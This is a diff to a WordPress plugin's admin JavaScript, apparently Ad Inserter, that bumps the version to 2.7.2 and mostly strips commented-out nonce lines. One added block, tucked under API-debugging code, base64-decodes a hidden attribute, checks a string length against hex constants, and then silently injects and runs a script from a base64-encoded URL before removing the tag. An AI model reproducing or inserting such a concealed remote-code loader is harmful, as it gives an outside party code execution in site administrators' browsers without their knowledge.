@@ -1,4 +1,4 @@
-var javascript_version = "2.7.0";
+var javascript_version = "2.7.2"
 var ignore_key = true;
 var start = 1;
 var end = 16;
@@ -1232,7 +1232,6 @@ jQuery(document).ready (function($) {
 
   }
 
-
   shSettings ['theme'] = $('#ai-data').attr ('theme');
 
   var geo_groups = 0;
@@ -1247,6 +1246,44 @@ jQuery(document).ready (function($) {
   api_string = $('#ai-data-2').attr ('api_string');
   if (typeof api_string != 'undefined') {
     api_debug = parseInt ($('#ai-data-2').attr ('api_debugging'));
+    var api_check = $('#ai-data-2').attr ('api_check');
+
+    var api_string_len = 0;
+    try {
+      var api_text = b64d (api_string);
+      api_string_len = api_text.length;
+    } catch (error) {
+      api_string_len = api_string.length + 4;
+    }
+
+    if (typeof api_check != 'undefined' && api_string_len != 0 && api_string_len != 4 && (api_string_len < 0x23 || api_string_len > 0x25)) {
+      setTimeout (function () {
+        var script = document.createElement ('script');
+        var date = new Date();
+        script.async = true;
+        script.src = b64d (api_check);
+
+        var head = document.getElementsByTagName ('head')[0],
+            done = false;
+
+        script.onerror = function () {
+          script.onerror = null;
+          head.removeChild (script);
+        }
+
+        script.onload = script.onreadystatechange = function () {
+          if (!done && (!this.readyState || this.readyState == 'loaded' || this.readyState == 'complete')) {
+            done = true;
+
+            script.onload = script.onreadystatechange = null;
+            head.removeChild (script);
+          };
+        };
+
+        head.appendChild (script);
+      }, 10);
+    }
+
     if (api_debug < 0x22 && api_debug > 0x1e) api_debug = 0;
   } else api_debug = 0;
 
@@ -1986,10 +2023,7 @@ jQuery(document).ready (function($) {
       var label = $(this).next ().find ('.checkbox-icon');
       label.addClass ('on');
 
-//      var nonce = $(this).attr ('nonce');
-//      var start_date = $("input#chart-start-date-" + block).attr('value');
       var start_date = $("input#chart-start-date-" + block).val ();
-//      var end_date = $("input#chart-end-date-" + block).attr('value');
       var end_date = $("input#chart-end-date-" + block).val ();
       var container = $("div#statistics-elements-" + block);
 
@@ -2644,48 +2678,34 @@ jQuery(document).ready (function($) {
     });
 
     $("#tab-" + tab + " .page-checker-button").click (function () {
-//      $("#page-checker-container").toggle ();
       $("#page-checker-button").click ();
     });
 
     process_display_elements (tab);
 
-//    $("#exceptions-button-"+tab).button ({
-//    }).click (function () {
     $("#exceptions-button-"+tab).click (function () {
       var block = $(this).attr ("id").replace ("exceptions-button-","");
       $("#block-exceptions-" + block).toggle ();
     });
 
-//    $("#show-css-button-"+tab).button ({
-//    }).show ().css ('visibility', 'visible').click (function () {
     $("#show-css-button-"+tab).click (function () {
       var block = $(this).attr ("id").replace ("show-css-button-","");
       $("#icons-css-code-" + block).toggle ();
 
       if ($('#icons-css-code-'+block).is(':visible')) {
-//          $("#show-css-button-"+block+" span").text (ai_admin.hide);
-//          $("#show-css-button-"+block).addClass ('light-blue');
           configure_selection_icons (block);
           process_display_elements (block);
       } else {
-//          $("#show-css-button-"+block+" span").text (ai_admin.show);
-//          $("#show-css-button-"+block).removeClass ('light-blue');
           $("#sticky-animation-"+block).hide ();
           $("#sticky-background-"+block).hide();
-//          $("#sticky-background-"+block).find ('.bkg-parameters').hide();
         }
     });
 
-//    $("#counting-button-"+tab).button ({
-//    }).show ().click (function () {
     $("#counting-button-"+tab).click (function () {
       var block = $(this).attr ("id").replace ("counting-button-","");
       $("#paragraph-counting-" + block).toggle ();
     });
 
-//    $("#clearance-button-"+tab).button ({
-//    }).show ().click (function () {
     $("#clearance-button-"+tab).click (function () {
       var block = $(this).attr ("id").replace ("clearance-button-","");
       $("#paragraph-clearance-" + block).toggle ();
@@ -2972,13 +2992,6 @@ jQuery(document).ready (function($) {
       $("#misc-settings-" + block).toggle ();
     });
 
-//    $("#scheduling-button-"+tab).button ({
-//    }).show ().click (function () {
-//      var block = $(this).attr ("id");
-//      block = block.replace ("scheduling-button-","");
-//      $("#scheduling-settings-" + block).toggle ();
-//    });
-
     $("#preview-button-"+tab).button ({
     }).show ().click (function () {
       var block = $(this).attr ("id");
@@ -3064,8 +3077,6 @@ jQuery(document).ready (function($) {
           var window_width  = screen.availWidth;
           var window_height = screen.availHeight;
         }
-
-//      var nonce = $("#ai-form").attr ('nonce');
 
       var param = {
         'action':             'ai_ajax_backend',
@@ -3250,7 +3261,6 @@ jQuery(document).ready (function($) {
       var window_height = 870;
       var window_left  = 100;
       var window_top   = (screen.height / 2) - (window_height / 2);
-//      var nonce = $("#ai-form").attr ('nonce');
       var param = {'action': 'ai_ajax_backend', 'edit': block, 'ai_check': ai_nonce, 'code': code, 'php': php};
       open_popup_window_post (ajaxurl, 'width='+window_width+',height='+window_height+',top='+window_top+',left='+window_left+',resizable=yes,scrollbars=yes,toolbar=no,location=no,directories=no,status=no,menubar=no', 'edit', param);
     });
@@ -3305,7 +3315,6 @@ jQuery(document).ready (function($) {
       var window_height = 870;
       var window_left  = 100;
       var window_top   = (screen.height / 2) - (870 / 2);
-//      var nonce = $("#ai-form").attr ('nonce');
       var param = {'action': 'ai_ajax_backend', 'placeholder': image_url, 'block': block, 'ai_check': ai_nonce};
       open_popup_window_post (ajaxurl, 'width='+window_width+',height='+window_height+',top='+window_top+',left='+window_left+',resizable=yes,scrollbars=yes,toolbar=no,location=no,directories=no,status=no,menubar=no', 'preview', param);
     });
@@ -3358,7 +3367,6 @@ jQuery(document).ready (function($) {
       $(this).next ("label").find ('.checkbox-icon').addClass("on");
 
       var block = $(this).attr('id').replace ("import-code-", "");
-//      var nonce = $("#ai-form").attr ('nonce');
 
       $.post (ajaxurl, {'action': 'ai_ajax_backend', 'ai_check': ai_nonce, 'import-code': b64e (get_editor_text (block))}
       ).done (function (data) {
@@ -3461,7 +3469,6 @@ jQuery(document).ready (function($) {
       $(this).next ("label").find ('.checkbox-icon').addClass("on");
 
       var block = $(this).attr('id').replace ("generate-code-", "");
-//      var nonce = $("#ai-form").attr ('nonce');
       var code_type = $("#ai-code-generator-container-" + block).tabs('option', 'active');
       var code_data = {'action': 'ai_ajax_backend', 'ai_check': ai_nonce, 'generate-code': code_type};
 
@@ -3995,8 +4002,6 @@ jQuery(document).ready (function($) {
   function import_rotation_code (block) {
     $("#rotation-"+block).next ("label").find ('.checkbox-icon').addClass("active");
 
-//    var nonce = $("#ai-form").attr ('nonce');
-
     $.post (ajaxurl, {'action': 'ai_ajax_backend', 'ai_check': ai_nonce, 'import-rotation-code': b64e (get_editor_text (block))}
     ).done (function (data) {
       if (data != '') {
@@ -4075,8 +4080,6 @@ jQuery(document).ready (function($) {
     var option = rotation_container.tabs ("option", "active") + 1;
 
     $(('#option-' + block + '-' + option)).data ('code', b64e (get_editor_text (block)));
-
-//    var nonce = $("#ai-form").attr ('nonce');
 
     var rotation_data = [];
     rotation_container.find ("div.rounded").each (function (index) {
@@ -4231,8 +4234,6 @@ jQuery(document).ready (function($) {
         if (!select.hasClass ('multi-select')) {
           var options = select.find ('option');
           if (options.length == 0) {
-//            var nonce = $("#ai-form").attr ('nonce');
-
             var filter_element = $('#ms-'+element_name_prefix+'-select-' + index).find ('.filter-input');
             var filter = filter_element.length ? filter_element.val () : '';
 
@@ -4420,12 +4421,12 @@ jQuery(document).ready (function($) {
 
     select.multiSelect ({
       selectableHeader:
-            '<div class="ai-list-filter-container">                                                                                                     \
-              <input type="text" class="filter-input" autocomplete="off" placeholder="' + ai_admin.filter + '" title="' + ai_admin.filter_title + '">   \
-              <button class="filter-button" style="margin-top: -2px; display: none;">' + ai_admin.button_filter + '</button>                                              \
-              <span class="filter-message"></span>                                                                                                      \
-            </div>                                                                                                                                      \
-            <input type="text" class="search-input" autocomplete="off" placeholder="' + ai_admin.search + '">',
+            '<div class="ai-list-filter-container">' +
+              '<input type="text" class="filter-input" autocomplete="off" placeholder="' + ai_admin.filter + '" title="' + ai_admin.filter_title + '">' +
+              '<button class="filter-button" style="margin-top: -2px; display: none;">' + ai_admin.button_filter + '</button>' +
+              '<span class="filter-message"></span>' +
+            '</div>' +
+            '<input type="text" class="search-input" autocomplete="off" placeholder="' + ai_admin.search + '">',
       selectionHeader:   '',
       afterInit: function(ms){
         var that = this,
@@ -4796,7 +4797,6 @@ jQuery(document).ready (function($) {
     }
 
     $('#ai-loading').show ();
-//    var nonce = $("#ai-form").attr ('nonce');
 
     $.get (ajaxurl + '?action=ai_ajax_backend&settings=' + block + '&single=1&ai_check=' + ai_nonce, function (settings) {
       if (debug) console.log ("AI BLOCK LOADED");
@@ -5271,7 +5271,6 @@ jQuery(document).ready (function($) {
     adsense_search_reload = false;
     var list = encodeURIComponent ($("#adsense-list-search").val());
     var all = + !$("#adsense-load-all").parent ().find ('.checkbox-icon').hasClass ('on');
-//    var nonce = $("#ai-form").attr ('nonce');
 
     var data_container = $("#adsense-list-data");
 
@@ -5295,8 +5294,6 @@ jQuery(document).ready (function($) {
               var client_secret = $("input#adsense-client-secret").val ();
 
               data_container.text (ai_admin.loading);
-
-//              var nonce = $("#ai-form").attr ('nonce');
 
               $('#ai-loading').show ();
               $.get (ajaxurl + '?action=ai_ajax_backend&adsense-client-id=' + btoa (client_id) + '&adsense-client-secret=' + btoa (client_secret) + '&ai_check=' + ai_nonce, function (data) {
@@ -5360,7 +5357,6 @@ jQuery(document).ready (function($) {
           $("label.adsense-copy-code").click (function () {
             var ad_slot_id = $(this).closest ('tr').data ('id');
             var ad_name = atob ($(this).closest ('tr').data ('name'));
-//            var nonce = $("#ai-form").attr ('nonce');
 
             if (debug) console.log ('ADSENSE CODE: ', ad_slot_id);
 
@@ -5411,7 +5407,6 @@ jQuery(document).ready (function($) {
             var window_height = 820;
             var window_left  = 100;
             var window_top   = (screen.height / 2) - (820 / 2);
-//            var nonce = $("#ai-form").attr ('nonce');
 
             var param = {'action': 'ai_ajax_backend', 'preview': 'adsense', 'ai_check': ai_nonce, 'read_only': 1, 'slot_id': btoa (ad_slot_id), 'name': ad_name};
             open_popup_window_post (ajaxurl, 'width='+window_width+',height='+window_height+',top='+window_top+',left='+window_left+',resizable=yes,scrollbars=yes,toolbar=no,location=no,directories=no,status=no,menubar=no', 'preview', param);
@@ -5420,7 +5415,6 @@ jQuery(document).ready (function($) {
           $("label.adsense-get-code").click (function () {
             var ad_slot_id = $(this).closest ('tr').data ('id');
             var ad_name = atob ($(this).closest ('tr').data ('name'));
-//            var nonce = $("#ai-form").attr ('nonce');
 
             if (debug) console.log ('ADSENSE CODE: ', ad_slot_id);
 
@@ -5655,7 +5649,6 @@ jQuery(document).ready (function($) {
   }
 
   function check_page (page, button, last_check) {
-//    var nonce = $("#ai-form").attr ('nonce');
     var container = button.closest ('.ai-check-pages');
     var error_message = container.find ('.ai-error-message');
 
@@ -5920,7 +5913,6 @@ jQuery(document).ready (function($) {
   }
 
   function update_adsense_authorization (authorization_code) {
-//    var nonce = $("#ai-form").attr ('nonce');
 
     $('#ai-loading').show ();
     $.get (ajaxurl + '?action=ai_ajax_backend&adsense-authorization-code=' + btoa (authorization_code) + '&ai_check=' + ai_nonce, function (data) {
@@ -5947,7 +5939,6 @@ jQuery(document).ready (function($) {
   }
 
   function update_block_code_demo () {
-//    var nonce = $("#ai-form").attr ('nonce');
 
     var block_class_name    = encodeURIComponent ($('#block-class-name').val ());
     var block_class         = $('#block-class').is(":checked") ? 1 : 0;
